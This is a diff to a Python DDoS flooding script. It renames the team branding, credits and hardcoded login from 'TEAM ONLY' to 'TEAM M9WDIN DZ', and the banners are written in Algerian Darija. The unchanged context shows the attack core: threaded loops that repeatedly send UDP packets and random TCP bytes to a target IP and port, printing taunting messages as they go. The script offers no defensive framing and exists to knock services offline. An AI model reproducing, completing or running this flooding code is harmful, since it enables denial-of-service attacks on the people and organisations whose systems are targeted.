@@ -9,10 +9,10 @@ import socket
 import sys
 import os
 
-###### TEAM ONLY!!! #####
+###### TEAM M9WDIN DZ!!! #####
 os.system("clear")
 os.system("None")
-print("\033[32m DDoS Team丶Only丶Is Loding ")
+print("\033[32m DDoS Team丶Maryol丶Is Loding ")
 time.sleep(2)
 print("Loading...")
 os.system("clear")
@@ -24,8 +24,8 @@ attemps = 0
 while attemps < 100:
     username = input('\033[34m Your Username : ')
     password = input('\033[34m Your Password : ')
-    if username == 'Ccp' and password == '999':
-        print('Mrhba Bik M3ana Fi Team!!')
+    if username == 'maryol' and password == 'maryol':
+        print('Mrhba Bik M3ana Fi Team M9wdin Dz!!')
         break
     else:
         print('\033[31m username w password Mshi Homa')
@@ -38,7 +38,7 @@ print("DDoS Is Loding : "+platform.system())
 if platform.system() == 'Windows':
 
 	print("""
- TEAM ONLY is Loding... :
+ TEAM M9WDIN is Loding... :
 
 ╱╱▏┈┈╱╱╱╱▏╱╱▏
 ▇╱▏┈┈▇▇▇╱▏▇╱▏
@@ -48,7 +48,7 @@ if platform.system() == 'Windows':
 else :
 	print("""
 	'\033[31m'
- TEAM ONLY Is Loding... :
+ TEAM M9WDIN Is Loding... :
 
     ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
  ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
@@ -63,8 +63,8 @@ else :
  ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁  
 	
-	Devloper : SAMORAY
-    Owner : CCP 999
+	Devloper : MARYOL CJ
+    Owner : MARYOL AND BJAWI
 			""")
 
 
@@ -85,9 +85,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"TEAM '\033[31m ONLY' TA9TA7EM!!!!")
+			print(i +"TEAM '\033[31m M9WDIN' TA9TA7EM!!!!")
 		except:
-			print("[!] TEAM ONLY TA9TA7EM!!!!")
+			print("[!] TEAM M9WDIN TA9TA7EM!!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -99,10 +99,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"TEAM '\033[32m ONLY' TA9TA7EM!!!!")
+			print(i +"TEAM '\033[32m M9WDIN' TA9TA7EM!!!!")
 		except:
 			s.close()
-			print("[*] TEAM ONLY TA9TA7EM!!!!")
+			print("[*] TEAM M9WDIN TA9TA7EM!!!!")
             
 for y in range(threads):
 	if choice == 'y':
